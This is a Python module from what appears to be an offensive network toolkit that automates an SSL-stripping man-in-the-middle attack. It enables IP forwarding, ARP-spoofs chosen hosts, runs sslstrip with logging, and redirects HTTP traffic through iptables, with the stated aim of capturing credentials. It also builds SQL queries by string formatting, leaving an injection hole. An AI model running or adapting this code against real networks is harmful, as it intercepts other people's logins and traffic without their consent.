from util_arp import *
import os
from capability import *

class sslstrip(Capability):

    def __init__(self, core):
        super(sslstrip, self).__init__(core)
        self.name = "SSL Strip"
        self.options = {
            "masq" : Option("masq", "", "ID of the computer to masquerade as", True),
            "source": Option("source", "", "ID of the source computer", True),
            "dest": Option("dest", "", "ID of the target", True),
            "name": Option("name", "ssl_log", "File to log output of sslstrip", True),
            }
        self.help_text = INFO + "ARP Spoof, then strip SSL traffic, allowing us to see credentials."

    def exec_command(self, comm):
        self.core.cur.execute(comm)
        return self.core.cur.fetchall()[0][0]

    def getVars(self):
        self.masq_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
        self.masq_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
        self.source_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
        self.source_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
        self.dest_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))
        self.dest_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))

    def arpGo(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        return arpBegin(self.masq_ip, self.masq_mac, self.source_mac, self.dest_ip, self.dest_mac)
    
    def restore(self):
        self.getVars()
        self.proc.terminate()
        arpEnd(self.masq_ip, self.masq_mac, self.dest_ip, self.dest_mac)
        os.system("killall sslstrip")
	os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")


    def launch(self):
        self.getVars()
        os.system("sslstrip -w " + str(self.get_value("name")) + " &")
        self.proc = self.arpGo()
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
        return self.proc
